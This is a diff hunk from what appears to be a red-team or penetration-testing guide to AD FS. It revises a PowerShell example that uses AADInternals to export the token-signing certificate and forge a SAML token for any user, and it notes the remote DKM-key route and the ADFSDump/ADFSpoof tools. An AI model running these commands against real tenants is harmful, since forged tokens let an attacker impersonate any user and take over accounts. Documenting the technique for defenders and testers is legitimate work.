@@ -45,9 +45,10 @@ Where the tenant federates through on-premises **AD FS**, the AD FS **token-sign
 The signing certificate is stored encrypted, protected by the **DKM** (Distributed Key Manager) master key held in Active Directory, so forging it needs admin on the AD FS server (or the DKM key plus the encrypted configuration from AD):
 
 ```powershell
-# AADInternals: export the AD FS signing certificate, then forge a SAML token for any user
-Export-AADIntADFSSigningCertificate -Server adfs.example.local
+# Run ON the AD FS server (admin): export the token-signing certificate to a PFX, then forge
+Export-AADIntADFSSigningCertificate -FileName signing.pfx
 New-AADIntSAMLToken -ImmutableID <user-immutableid> -PfxFileName signing.pfx -Issuer "http://adfs.example.local/adfs/services/trust"
+# remotely, export the configuration + DKM key first (Export-AADIntADFSConfiguration / -ADFSEncryptionKey);
 # ADFSDump + ADFSpoof are the equivalent standalone toolchain
 ```
 
